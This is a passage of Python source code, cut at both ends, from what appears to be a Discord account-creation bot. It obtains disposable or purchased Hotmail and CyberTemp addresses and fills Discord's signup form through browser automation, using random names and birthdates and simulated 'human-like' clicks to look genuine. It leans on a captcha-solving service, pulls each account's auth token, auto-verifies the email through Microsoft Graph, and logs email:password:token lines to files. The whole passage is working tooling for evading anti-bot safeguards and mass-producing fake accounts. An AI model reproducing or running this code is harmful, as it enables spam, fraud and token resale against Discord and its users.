                    log.success(f"✓ Got {mail_type}: {email}")
                    return {
                        "success": True,
                        "email": email,
                        "password": password,
                        "token": account.get("token", ""),
                        "uuid": account.get("uuid", "")
                    }
            time.sleep(1)
        
        log.error("Failed to purchase email after 20s")
        return {"success": False, "error": "Timeout after 20s"}
    
    def check_inbox(self, email: str) -> dict:
        """Check inbox for verification emails"""
        try:
            response = self.session.get(
                f"{self.base_url}/inbox",
                params={
                    "clientKey": self.client_key,
                    "email": email
                },
                verify=False,
                timeout=30
            )
            if response.status_code == 200:
                data = response.json()
                return {"success": True, "messages": data.get("messages", [])}
            else:
                return {"success": False, "error": f"HTTP {response.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ============================================================================
# CYBERTEMP EMAIL API
# ============================================================================

class CybertempAPI:
    """CyberTemp API for temporary Discord-compatible email addresses"""
    
    def __init__(self, api_key: str = None):
        self.api_key = api_key
        self.base_url = "https://api.cybertemp.xyz"
        self.session = requests.Session()
        self.session.verify = False
        if api_key:
            self.session.headers.update({"X-API-KEY": api_key})
    
    def get_discord_domains(self) -> list:
        """Fetch all discord-type domains from CyberTemp"""
        try:
            resp = self.session.get(
                f"{self.base_url}/getDomains",
                params={"type": "discord", "limit": 100},
                timeout=30
            )
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and data:
                    return data
                else:
                    log.error(f"CyberTemp getDomains unexpected response: {data}")
            else:
                log.error(f"CyberTemp getDomains HTTP {resp.status_code}: {resp.text[:200]}")
        except Exception as e:
            log.error(f"CyberTemp getDomains error: {e}")
        return []
    
    def create_email(self) -> dict:
        """
        Generate a random email address using a CyberTemp discord domain.
        Returns: {"success": True, "email": "user@domain.com", "password": "xxx"}
        """
        domains = self.get_discord_domains()
        if not domains:
            log.error("No CyberTemp discord domains available")
            return {"success": False, "error": "No discord domains available"}
        
        domain = random.choice(domains)
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local_part}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=16))
        
        return {
            "success": True,
            "email": email,
            "password": password,
            "domain": domain
        }
    
    def check_inbox(self, email: str) -> dict:
        """Check inbox for messages sent to a CyberTemp address"""
        try:
            resp = self.session.get(
                f"{self.base_url}/getMail",
                params={"email": email},
                timeout=30
            )
            if resp.status_code == 200:
                data = resp.json()
                messages = data if isinstance(data, list) else data.get("messages", [])
                return {"success": True, "messages": messages}
            else:
                return {"success": False, "error": f"HTTP {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}


def get_hotmail007_email(config: dict) -> tuple:
    """
    Get email from Hotmail007 API with AUTO-RETRY
    Returns: (email, password, token, uuid) or (None, None, None, None) if failed
    """
    client_key = config.get("email_api", {}).get("hotmail007", {}).get("client_key", "").strip()
    auto_buy = config.get("email_api", {}).get("hotmail007", {}).get("auto_buy", True)
    
    if not client_key:
        log.warning("No Hotmail007 client_key configured")
        return None, None, None, None
    
    if not auto_buy:
        log.info("Auto-buy disabled in config")
        return None, None, None, None
    
    # Initialize API
    api = Hotmail007API(client_key)
    
    # Buy email with auto-retry (tries outlook and hotmail types)
    result = api.buy_email(max_retries=10)
    
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            result.get("token", ""),
            result.get("uuid", "")
        )
    else:
        log.error("Failed to purchase email after all retries")
        return None, None, None, None


def get_cybertemp_email(config: dict) -> tuple:
    """
    Get a temporary email from CyberTemp API (always uses discord domains)
    Returns: (email, password, token, uuid) or (None, None, None, None) if failed
    """
    cybertemp_config = config.get("email_api", {}).get("cybertemp", {})
    enabled = cybertemp_config.get("enabled", False)
    api_key = cybertemp_config.get("api_key", "").strip()
    
    if not enabled:
        return None, None, None, None
    
    # Initialize API (api_key is optional - free tier works without subscription)
    api = CybertempAPI(api_key if api_key else None)
    
    result = api.create_email()
    
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            "",  # No OAuth token for CyberTemp
            ""   # No uuid for CyberTemp
        )
    else:
        log.error("Failed to generate CyberTemp email")
        return None, None, None, None




# ============================================================================
# HOTMAIL POOL PROVIDER  (reads from input/mails.json)
# ============================================================================

# Thread-safe pool state
_POOL_LOCK   = threading.Lock()
_POOL_INDEX  = 0   # next account to hand out (round-robin)

def _load_mail_pool(pool_file: str) -> list:
    """Load the mail pool JSON from disk. Returns [] on any error."""
    path = Path(pool_file)
    if not path.exists():
        log.warning(f"Hotmail pool file not found: {pool_file}")
        return []
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, list):
            log.error("mails.json must be a JSON array")
            return []
        return data
    except Exception as e:
        log.error(f"Failed to load mail pool: {e}")
        return []


def _remove_pool_entry(pool_file: str, email: str):
    """Remove a used/exhausted account from the pool file."""
    try:
        pool = _load_mail_pool(pool_file)
        pool = [e for e in pool if e.get("Email", "").lower() != email.lower()]
        with open(pool_file, "w", encoding="utf-8") as f:
            json.dump(pool, f, indent=2)
        # Also update hotmails.txt
        txt_path = Path(pool_file).parent / "hotmails.txt"
        if txt_path.exists():
            lines = txt_path.read_text(encoding="utf-8").splitlines()
            lines = [l for l in lines if not l.lower().startswith(email.lower() + ":")]
            txt_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    except Exception as e:
        log.debug(f"Could not remove pool entry: {e}")


def get_hotmail_pool_email(config: dict) -> tuple:
    """
    Pop the next account from the local Hotmail pool (input/mails.json).
    Uses round-robin so multiple threads don't collide.
    Returns: (email, password, refresh_token, client_id) or (None,None,None,None)
    """
    global _POOL_INDEX
    pool_file = config.get("email_api", {}).get("hotmail_pool", {}).get("file", "input/mails.json")
    pool = _load_mail_pool(pool_file)
    if not pool:
        log.error("Hotmail pool is empty — add accounts to input/mails.json")
        return None, None, None, None

    with _POOL_LOCK:
        idx = _POOL_INDEX % len(pool)
        entry = pool[idx]
        _POOL_INDEX += 1

    email         = entry.get("Email", "")
    password      = entry.get("Password", "")
    refresh_token = entry.get("RefreshToken", "")
    client_id     = entry.get("ClientId", "") or MS_CLIENT_ID

    # Strip trailing $ that Microsoft sometimes appends
    if refresh_token.endswith("$"):
        refresh_token = refresh_token[:-1]

    if not email or not password:
        log.error("Pool entry missing Email or Password")
        return None, None, None, None

    log.success(f"Pool account  {GRAY}{email}")
    return email, password, refresh_token, client_id


def get_email_from_provider(config: dict) -> tuple:
    """
    Get email from configured provider (Hotmail007, CyberTemp, or HotmailPool)
    Returns: (email, password, token, uuid, provider) or (None, None, None, None, None) if failed
    """
    pool_enabled    = config.get("email_api", {}).get("hotmail_pool", {}).get("enabled", False)
    cybertemp_enabled = config.get("email_api", {}).get("cybertemp", {}).get("enabled", False)
    hotmail_enabled = config.get("email_api", {}).get("hotmail007", {}).get("auto_buy", True)

    # Try HotmailPool first if enabled
    if pool_enabled:
        log.info("Using Hotmail Pool as mail provider")
        email, password, token, uuid = get_hotmail_pool_email(config)
        if email:
            return email, password, token, uuid, "hotmail_pool"

    # Try CyberTemp if enabled
    if cybertemp_enabled:
        log.info("Using Cybertemp as mail provider")
        email, password, token, uuid = get_cybertemp_email(config)
        if email:
            return email, password, token, uuid, "cybertemp"

    # Try Hotmail007 if enabled
    if hotmail_enabled:
        log.info("Using Hotmail007 email provider")
        email, password, token, uuid = get_hotmail007_email(config)
        if email:
            return email, password, token, uuid, "hotmail007"

    log.error("No email provider available or all failed")
    return None, None, None, None, None


# ============================================================================
# MS GRAPH EMAIL VERIFICATION
# ============================================================================

def get_access_token(refresh_token: str, client_id: str = None) -> Optional[str]:
    """Get MS Graph access token from refresh token"""
    try:
        cid = client_id or MS_CLIENT_ID
        if refresh_token.endswith("$"):
            refresh_token = refresh_token[:-1]
        
        response = requests.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            data={
                "client_id": cid,
                "refresh_token": refresh_token,
                "grant_type": "refresh_token",
                "scope": "https://graph.microsoft.com/.default"
            },
            timeout=30,
            verify=False
        )
        result = response.json()
        return result.get("access_token")
    except Exception as e:
        log.error(f"Token refresh error: {e}")
        return None


def fetch_verification_url(email_data: Dict, timeout: int = 120) -> Optional[str]:
    """Fetch Discord verification URL from email using MS Graph API"""
    log.info("Fetching verification email from inbox...")
    
    refresh_token = email_data.get("token", "")
    client_id = email_data.get("uuid", "") or MS_CLIENT_ID
    
    access_token = get_access_token(refresh_token, client_id)
    if not access_token:
        log.error("Failed to get Graph access token")
        return None
    
    start_time = time.time()
    attempt = 0
    
    while (time.time() - start_time) < timeout:
        attempt += 1
        try:
            response = requests.get(
                "https://graph.microsoft.com/v1.0/me/messages",
                headers={"Authorization": f"Bearer {access_token}"},
                params={
                    "$top": 5,
                    "$orderby": "receivedDateTime desc",
                    "$select": "subject,body,from,bodyPreview,receivedDateTime"
                },
                timeout=15,
                verify=False
            )
            emails = response.json().get("value", [])
            
            if attempt % 5 == 0:
                elapsed = int(time.time() - start_time)
                log.info(f"Checking inbox... ({elapsed}s elapsed)")
            
            for email in emails:
                subject = email.get("subject", "").lower()
                from_addr = email.get("from", {}).get("emailAddress", {}).get("address", "").lower()
                
                # Must be a Discord email verification
                is_verify_email = (
                    ("verify" in subject or "confirm" in subject or "email" in subject) and
                    ("discord" in from_addr or "noreply@discord.com" in from_addr)
                )
                
                if not is_verify_email:
                    continue
                
                body_html = email.get("body", {}).get("content", "")
                
                # First priority: Direct discord.com/verify link
                verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                direct_match = re.search(verify_pattern, body_html)
                if direct_match:
                    log.success("Found verify link in email!")
                    return direct_match.group(0)
                
                # Second priority: Click tracking links
                click_patterns = [
                    r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+',
                    r'https://links\.discord\.com[^"\'\>\s]+'
                ]
                
                for pat in click_patterns:
                    for m in re.finditer(pat, body_html):
                        url = m.group(0)
                        try:
                            resp = requests.get(url, allow_redirects=True, verify=False)
                            final_url = resp.url
                            
                            if "discord.com/verify" in final_url:
                                log.success("Found verify link via redirect!")
                                return final_url
                            
                            verify_in_body = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', resp.text)
                            if verify_in_body:
                                log.success("Found verify link in response body!")
                                return verify_in_body.group(0)
                        except:
                            pass
                
                log.warning("Discord email found but no valid verify link")
                    
        except Exception as e:
            log.warning(f"Graph API error: {e}")
        
        time.sleep(3)
    
    log.warning("Verification email not found after timeout")
    return None

# ============================================================================
# CYBERTEMP EMAIL VERIFICATION
# ============================================================================

def fetch_verification_url_cybertemp(email: str, api_key: str = None, timeout: int = 120) -> Optional[str]:
    """
    Poll CyberTemp /getMail until a Discord verification email arrives,
    then extract and return the verify URL.
    """
    log.info(f"Polling CyberTemp inbox for verification email: {email}")
    
    headers = {}
    if api_key:
        headers["X-API-KEY"] = api_key
    
    base_url = "https://api.cybertemp.xyz/getMail"
    start_time = time.time()
    attempt = 0
    seen_ids = set()
    
    while (time.time() - start_time) < timeout:
        attempt += 1
        try:
            resp = requests.get(
                base_url,
                params={"email": email, "limit": 25},
                headers=headers,
                timeout=20,
                verify=False
            )
            
            if resp.status_code != 200:
                log.debug(f"CyberTemp getMail HTTP {resp.status_code}")
                time.sleep(3)
                continue
            
            messages = resp.json()
            if not isinstance(messages, list):
                time.sleep(3)
                continue
            
            if attempt % 5 == 0:
                elapsed = int(time.time() - start_time)
                log.info(f"Checking CyberTemp inbox... ({elapsed}s elapsed, {len(messages)} emails found)")
            
            for msg in messages:
                msg_id = msg.get("id", "")
                if msg_id in seen_ids:
                    continue
                seen_ids.add(msg_id)
                
                subject   = (msg.get("subject") or "").lower()
                from_addr = (msg.get("from")    or "").lower()
                body_html = msg.get("html")  or msg.get("text") or ""
                
                # Must be from Discord and look like a verify email
                is_discord = "discord" in from_addr or "noreply@discord.com" in from_addr
                is_verify  = any(k in subject for k in ("verify", "confirm", "email"))
                
                if not (is_discord and is_verify):
                    continue
                
                
                # Direct verify link
                direct = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s&]+(?:&[^"\'\>\s]+)*', body_html)
                if direct:
                    log.success("Extracted direct verify link!")
                    return direct.group(0)
                
                # Click-tracking / redirect links
                for pat in [
                    r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+',
                    r'https://links\.discord\.com[^"\'\>\s]+'
                ]:
                    for m in re.finditer(pat, body_html):
                        url = m.group(0)
                        try:
                            r2 = requests.get(url, allow_redirects=True, verify=False)
                            if "discord.com/verify" in r2.url:
                                log.success("Extracted verify link via redirect!")
                                return r2.url
                            found = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', r2.text)
                            if found:
                                log.success("Extracted verify link from redirect body!")
                                return found.group(0)
                        except:
                            pass
                
                log.warning("Discord email found but could not extract verify link")
        
        except Exception as e:
            log.debug(f"CyberTemp poll error: {e}")
        
        time.sleep(3)
    
    log.warning("Verification email not found in CyberTemp inbox after timeout")
    return None


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_random_string(length: int) -> str:
    """Generate random alphanumeric string"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def generate_username() -> str:
    """Generate random username"""
    adjectives = ['Cool', 'Epic', 'Super', 'Mega', 'Ultra', 'Pro', 'Elite', 'Master']
    nouns = ['Gamer', 'Player', 'User', 'Hero', 'Legend', 'Champion', 'Warrior']
    return f"{random.choice(adjectives)}{random.choice(nouns)}{random.randint(1232323200, 923322323232999)}"


def generate_password(length: int = 16) -> str:
    """Generate secure random password"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choices(chars, k=length))
    # Ensure it has at least one of each type
    if not any(c.isupper() for c in password):
        password = password[:1].upper() + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + str(random.randint(0, 9))
    return password


def check_token(token: str) -> str:
    """
    Check if Discord token is valid, locked, or invalid
    Returns: 'VALID', 'LOCKED', 'INVALID', or 'ERROR'
    """
    try:
        session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True)
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        }
        
        # Use library endpoint like the working checker
        response = session.get(
            'https://discordapp.com/api/v9/users/@me/library',
            headers=headers
        )
        
        if response.status_code == 200:
            return 'VALID'
        elif response.status_code == 403:
            # Account locked/disabled
            return 'LOCKED'
        elif response.status_code == 401:
            return 'INVALID'
        elif response.status_code == 429:
            # Rate limited - treat as error to retry later
            return 'ERROR'
        else:
            return 'INVALID'
    except Exception as e:
        log.debug(f"Token check error: {e}")
        return 'ERROR'


def save_account_to_file(email: str, password: str, token: str, status: str):
    """
    Save account to appropriate file based on token status
    - valid.txt: Working accounts
    - locked.txt: Locked/disabled accounts
    - invalid.txt: Invalid tokens
    """
    global TOTAL_VALID, TOTAL_LOCKED, TOTAL_INVALID
    try:
        # Determine output file based on status
        if status == 'VALID':
            output_file = OUTPUT_DIR / "valid.txt"
            with LOCK:
                TOTAL_VALID += 1
        elif status == 'LOCKED':
            output_file = OUTPUT_DIR / "locked.txt"
            with LOCK:
                TOTAL_LOCKED += 1
        else:  # INVALID or ERROR
            output_file = OUTPUT_DIR / "invalid.txt"
            with LOCK:
                TOTAL_INVALID += 1
        
        # Save account
        with LOCK:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{token}\n")
        
        log.success(f"✓ Saved to {output_file.name}")
        return True
    except Exception as e:
        log.error(f"Failed to save account: {e}")
        return False


def check_email_verified_api(token: str):
    """Check if email is verified via API"""
    try:
        session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True)
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = session.get(
            'https://discord.com/api/v9/users/@me',
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            verified = data.get('verified', False)
            email = data.get('email', 'N/A')
            return verified, email
        
        return None, None
    except:
        return None, None


# ============================================================================
# REGISTRATION FORM FILLING - FIXED VERSION
# ============================================================================

async def fill_registration_form(page, email: str, display_name: str, username: str, password: str) -> bool:
    """
    Fill Discord registration form with proper element waiting
    """
    try:
        log.info("Filling form...")
        
        # Email - wait for it to exist
        try:
            email_element = await page.wait_for('input[name="email"]', timeout=10000)
            await email_element.send_keys(email)
            await asyncio.sleep(0.1)
        except Exception as e:
            log.error(f"Email input failed: {e}")
            return False
        
        # Display Name
        try:
            display_element = await page.wait_for('input[name="global_name"]', timeout=5000)
            await display_element.send_keys(display_name)
            await asyncio.sleep(0.1)
        except Exception as e:
            log.error(f"Display name input failed: {e}")
            return False
        
        # Username
        try:
            username_element = await page.wait_for('input[name="username"]', timeout=5000)
            await username_element.send_keys(username)
            await asyncio.sleep(0.1)
        except Exception as e:
            log.error(f"Username input failed: {e}")
            return False
        
        # Password
        try:
            password_element = await page.wait_for('input[aria-label="Password"]', timeout=5000)
            await password_element.send_keys(password)
            await asyncio.sleep(0.1)
        except Exception as e:
            log.error(f"Password input failed: {e}")
            return False
        
        # Date of birth
        await asyncio.sleep(0.2)
        await fill_date_of_birth(page)
        await asyncio.sleep(0.1)
        
        # Inject JS and click checkboxes
        try:
            await page.evaluate(JS_UTILS)
            await asyncio.sleep(0.1)
            result = await page.evaluate('window.utils.clickAllCheckboxes()')
            if result and result.get('clicked', 0) > 0:
                log.success(f"✓ Clicked {result.get('clicked')} checkbox(es)")
            await asyncio.sleep(0.1)
        except Exception as e:
            log.debug(f"Checkbox error: {e}")
        
        # Find and click submit button
        clicked = False
        
        # Wait a bit for submit button to be enabled
        await asyncio.sleep(0.3)
        
        # Try finding submit button
        try:
            buttons = await page.query_selector_all('button')
            for button in buttons:
                try:
                    text = await button.get('textContent') or ""
                    if text and any(keyword in text for keyword in ['Continue', 'Create', 'Submit', 'Register']):
                        await button.click()
                        clicked = True
                        break
                except:
                    continue
        except:
            pass
        
        # Fallback: submit by type
        if not clicked:
            try:
                submit = await page.query_selector('[type="submit"]')
                if submit:
                    await submit.click()
                    clicked = True
            except:
                pass
        
        if not clicked:
            log.error("Could not find submit button")
            return False
        
        # Try method 3: Last resort - evaluate and click
        if not clicked:
            try:
                log.info("Trying submit via evaluate...")
                clicked_eval = await page.evaluate('''() => {
                    const buttons = document.querySelectorAll('button');
                    for (const btn of buttons) {
                        const text = btn.textContent || '';
                        if (text.includes('Continue') || text.includes('Create') || text.includes('Submit')) {
                            btn.click();
                            return true;
                        }
                    }
                    return false;
                }''')
                
                if clicked_eval:
                    clicked = True
                    log.success("Clicked submit button via evaluate")
            except Exception as e:
                log.warning(f"Evaluate submit failed: {e}")
        
        if not clicked:
            log.error("✗ Failed to click submit button!")
            return False
        
        log.success("✓ Form submitted!")
        return True
        
    except Exception as e:
        log.error(f"Form fill error: {e}")
        import traceback
        traceback.print_exc()
        return False


async def fill_date_of_birth(page):
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1990, 2004))
    
    try:
        await page.evaluate(f'''
        (async () => {{
            async function selectByTyping(label, value) {{
                // 1. Find the combobox
                const combo = document.querySelector(`div[role="combobox"][aria-label="${{label}}"]`);
                if (!combo) return false;

                // 2. Click to focus and open
                combo.click();
                await new Promise(r => setTimeout(r, 400));

                // 3. Instead of clicking an option, we "type" the name.
                // Discord dropdowns jump to the item when you type the first few letters.
                // We send a KeyboardEvent to the active element.
                for (let char of value) {{
                    const event = new KeyboardEvent('keydown', {{
                        key: char,
                        bubbles: true,
                        cancelable: true
                    }});
                    document.activeElement.dispatchEvent(event);
                    await new Promise(r => setTimeout(r, 20)); // Type naturally
                }}

                await new Promise(r => setTimeout(r, 300));

                // 4. Press "Enter" to confirm the selection
                const enterEvent = new KeyboardEvent('keydown', {{
                    key: 'Enter',
                    code: 'Enter',
                    keyCode: 13,
                    which: 13,
                    bubbles: true,
                    cancelable: true
                }});
                document.activeElement.dispatchEvent(enterEvent);
                
                // 5. Force a blur to ensure focus is released
                await new Promise(r => setTimeout(r, 400));
                document.activeElement.blur();
                return true;
            }}

            // Sequence with forced delays
            await selectByTyping("Month", "{month}");
            await new Promise(r => setTimeout(r, 600));
            await selectByTyping("Day", "{day}");
            await new Promise(r => setTimeout(r, 600));
            await selectByTyping("Year", "{year}");

            // Wait for Discord to enable the button and click it
            await new Promise(r => setTimeout(r, 1000));
            const btn = document.querySelector('button[type="submit"]');
            if (btn) btn.click();
        }})()
        ''')
        log.success(f"✓ DOB Filled via Keyboard: {month} {day}, {year}")
    except Exception as e:
        log.error(f"Keyboard DOB failed: {e}")


# ============================================================================
# WAIT FOR ACCOUNT CREATION
# ============================================================================

async def wait_for_account_creation(page, timeout: int = 300) -> bool:
    """Wait for Discord to redirect away from /register after account creation."""
    start_time = time.time()
    i = 0
    last_url = ""

    # Error phrases Discord shows on the register page for rejected submissions
    _REGISTER_ERRORS = [
        "already registered",
        "email already",
        "this email",
        "invalid email",
        "too many accounts",
        "new registrations",
    ]

    while (time.time() - start_time) < timeout:
        await asyncio.sleep(0.3)
        i += 1

        try:
            # Always use JS to get the real current URL — page.url unreliable in Brave
            try:
                raw = await page.evaluate('window.location.href')
                if hasattr(raw, 'value'):
                    current_url = raw.value or ""
                elif isinstance(raw, tuple):
                    r = raw[0]
                    current_url = (r.value if hasattr(r, 'value') else str(r)) if r else ""
                else:
                    current_url = str(raw) if raw else ""
            except Exception:
                current_url = ""

            if current_url and current_url != last_url:
                last_url = current_url

            if not current_url:
                continue

            # Success: redirected away from register
            skip = ['discord.com/register', 'discord.com/login', 'about:blank', 'chrome://']
            if 'discord.com' in current_url and not any(s in current_url for s in skip):
                log.success(f"Account created! Redirected to: {current_url}")
                return True

            # Check for inline error messages on the register page (e.g. already registered)
            if 'discord.com/register' in current_url and i % 5 == 0:
                try:
                    page_text = await page.evaluate('document.body.innerText')
                    if page_text:
                        page_lower = page_text.lower()
                        for err in _REGISTER_ERRORS:
                            if err in page_lower:
                                log.warning(f"Registration rejected: {err}")
                                return False
                except Exception:
                    pass

        except Exception as e:
            log.debug(f"URL check error: {e}")

    log.error("Timeout waiting for account creation")
    return False


# ============================================================================
# TOKEN EXTRACTION
# ============================================================================

async def wait_for_discord_token(page, timeout: int = 30, email: str = None, password: str = None):
    """Extract Discord authentication token using API call"""
    log.info("Fetching Discord token via API...")
    
    if not email or not password:
        log.error("Email and password required for token fetch")
        return None
    
    # Wait a bit for account to be ready
    await asyncio.sleep(3)
    
    attempts = 0
    max_attempts = 5
    
    while attempts < max_attempts:
        attempts += 1
        
        try:
            # Use API to fetch token
            token = await fetch_discord_token(email, password)
            
            if token:
                log.success(f"✓ Token fetched via API! (attempt {attempts})")
                return token
            else:
                log.warning(f"API returned empty token (attempt {attempts})")
        
        except Exception as e:
            log.debug(f"Error fetching token via API (attempt {attempts}): {e}")
        
        # Wait before retry
        await asyncio.sleep(3)
    
    log.error(f"Could not fetch token after {attempts} attempts")
    return None


# ============================================================================
# SAFE BROWSER NAVIGATION HELPER
# ============================================================================

async def safe_browser_get(browser, url: str, max_retries: int = 3):
    """
    Safely navigate browser to URL with retry logic for StopIteration errors
    """
    for attempt in range(max_retries):
        try:
            page = await browser.get(url)
            return page
        except (StopIteration, RuntimeError) as e:
            if attempt < max_retries - 1:
                log.warning(f"Browser navigation failed (attempt {attempt + 1}/{max_retries}), retrying...")
                await asyncio.sleep(2)
            else:
                log.error(f"Failed to navigate to {url} after {max_retries} attempts")
                raise
    return None


# ============================================================================
# MAIN WORKER FUNCTION
# ============================================================================

async def worker(thread_id: int = 1, browser=None):
    """Main worker function to create Discord account"""
    global SESSION_CREATED, SESSION_STOP, NOPECHA_BROWSER
    profile_dir = None

    # Check if session target already reached
    if SESSION_STOP:
        return

    try:
        # Get proxy from session config (set in terminal)
        proxy = config.get("proxy_session")
        proxy_display = proxy if proxy else "none"
        
        # Generate account details
        username = generate_username()
        display_name = random.choice([
            # Arabic/Middle Eastern Names
            'Afham', 'Arhan', 'Ahmed', 'Ali', 'Hassan', 'Ibrahim', 'Karim', 'Malik', 'Nasser', 'Omar',
            'Rashid', 'Samir', 'Tariq', 'Walid', 'Youssef', 'Zahra', 'Amina', 'Fatima', 'Layla', 'Mariam',
            'Noor', 'Rania', 'Samira', 'Yasmin', 'Nadia', 'Hana', 'Iman', 'Leila', 'Maha', 'Salma',
            # Western Names
            'Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Sam', 'Blake', 'Drew', 'Avery',
            'Jamie', 'Parker', 'Quinn', 'Rowan', 'Sage', 'Scout', 'Skyler', 'Tatum', 'Vale', 'Xander',
            # European Names
            'Henrik', 'Johan', 'Magnus', 'Nils', 'Soren', 'Stellan', 'Anders', 'Lars', 'Mikael', 'Olaf',
            'Pierre', 'Jean', 'Claude', 'Antoine', 'Benoit', 'Cedric', 'Dominique', 'Fabrice', 'Gerard', 'Henri',
            'Klaus', 'Gunther', 'Friedrich', 'Wolfgang', 'Jasper', 'Matthias', 'Sebastian', 'Christoph', 'Stefan', 'Andreas',
            # Asian Names
            'Akira', 'Hideo', 'Kenji', 'Koji', 'Masaru', 'Noboru', 'Satoshi', 'Takeshi', 'Toshiro', 'Yuki',
            'Wei', 'Lei', 'Ming', 'Jun', 'Feng', 'Hua', 'Jie', 'Liang', 'Peng', 'Xia',
            'Arjun', 'Ankit', 'Aditya', 'Devesh', 'Harish', 'Raj', 'Vikram', 'Rohan', 'Sanjay', 'Nikhil',
            # Fashion/Sport Names
            'Ashton', 'Bradley', 'Calvin', 'Derek', 'Ethan', 'Fiona', 'Graham', 'Harper', 'Isabella', 'Jackson',
            'Kai', 'Logan', 'Mason', 'Nathan', 'Owen', 'Patrick', 'Quinn', 'Ryan', 'Sean', 'Tyler'
        ])
        
        # Try to get email from configured provider — run in executor to not block other threads
        loop = asyncio.get_event_loop()
        email_from_api, email_password, email_token, email_uuid, email_provider = await loop.run_in_executor(
            None, get_email_from_provider, config
        )
        
        if email_from_api:
            email = email_from_api
            # Use email password as Discord password
            password = email_password
            log.thread_header(thread_id, proxy_display)
            log.email_got(email)
            # Remove from pool immediately — offload to executor so it doesn't block
            if email_provider == "hotmail_pool":
                pool_file = config.get("email_api", {}).get("hotmail_pool", {}).get("file", "input/mails.json")
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(None, _remove_pool_entry, pool_file, email)
        else:
            # Fallback to temporary email
            email = f"{generate_random_string(12)}@tempmail.com"
            email_password = "N/A"
            password = generate_password()
            log.error("Failed to get email")
            return
        
        # Get a fresh Discord register page in the browser for this thread
        if browser is None:
            browser = NOPECHA_BROWSER
        page = await get_browser_page(browser)
        profile_dir = None

        if page is None:
            log.error('no browser page — retrying')
            return

        # Wait for register page to load
        page_loaded = False
        for _ in range(30):
            try:
                if await page.query_selector('input[name="email"]'):
                    page_loaded = True
                    break
            except Exception:
                pass
            await asyncio.sleep(0.5)

        log.register_page()
        await asyncio.sleep(0.5)

        # Fill form
        success = await fill_registration_form(page, email, display_name, username, password)
        if not success:
            log.error('form fill failed')
            return

        log.filled_info()

        # Random human-like clicks
        try:
            for _ in range(5):
                await page.mouse_click(random.randint(100, 800), random.randint(100, 600))
                await asyncio.sleep(random.uniform(0.05, 0.15))
        except Exception:
            pass

        # NopeCHA solves captcha automatically
        log.solving_captcha()
        created = await wait_for_account_creation(page)
        if created:
            log.captcha_solved()

        if not created:
            log.error('account creation failed')
            return

        # Extract token
        log.info('fetching token')
        token = await wait_for_discord_token(page, email=email, password=password)

        if token:
            if token.startswith('"') and token.endswith('"'):
                token = token[1:-1]

            token_match = re.search(r'([a-zA-Z0-9_-]{20,})\.([a-zA-Z0-9_-]{6})\.([a-zA-Z0-9_-]{27,})', token)
            if token_match:
                token = f"{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}"

            log.token_got(token)

            # Verify email
            log.info('verifying email')
            loop = asyncio.get_event_loop()
            verified, user_email = await loop.run_in_executor(None, check_email_verified_api, token)

            if verified is not None:
                if verified:
                    log.verified_mail()
                else:
                    if email_provider == "cybertemp":
                        ct_api_key = config.get("email_api", {}).get("cybertemp", {}).get("api_key", "").strip() or None
                        verify_url = await loop.run_in_executor(None, fetch_verification_url_cybertemp, email, ct_api_key)
                        if verify_url:
                            try:
                                vpage = await browser.get(verify_url)
                                await asyncio.sleep(5)
                                for _ in range(12):
                                    await asyncio.sleep(5)
                                    verified, _ = await loop.run_in_executor(None, check_email_verified_api, token)
                                    if verified:
                                        log.verified_mail()
                                        break
                            except Exception as e:
                                log.warning('verify failed  ' + GRAY + str(e))

                    elif email_provider == "hotmail007" and email_token:
                        email_data = {"email": email, "password": email_password, "token": email_token, "uuid": email_uuid}
                        verify_url = await loop.run_in_executor(None, fetch_verification_url, email_data)
                        if verify_url:
                            try:
                                vpage = await browser.get(verify_url)
                                await asyncio.sleep(5)
                                for _ in range(12):
                                    await asyncio.sleep(5)
                                    verified, _ = await loop.run_in_executor(None, check_email_verified_api, token)
                                    if verified:
                                        log.verified_mail()
                                        break
                            except Exception as e:
                                log.warning(f"Verify error: {e}")

                    elif email_provider == "hotmail_pool" and email_token:
                        email_data = {"email": email, "password": email_password, "token": email_token, "uuid": email_uuid}
                        verify_url = await loop.run_in_executor(None, fetch_verification_url, email_data)
                        if verify_url:
                            try:
                                vpage = await browser.get(verify_url)
                                await asyncio.sleep(5)
                                for _ in range(12):
                                    await asyncio.sleep(5)
                                    verified, _ = await loop.run_in_executor(None, check_email_verified_api, token)
                                    if verified:
                                        log.verified_mail()
                                        break
                            except Exception as e:
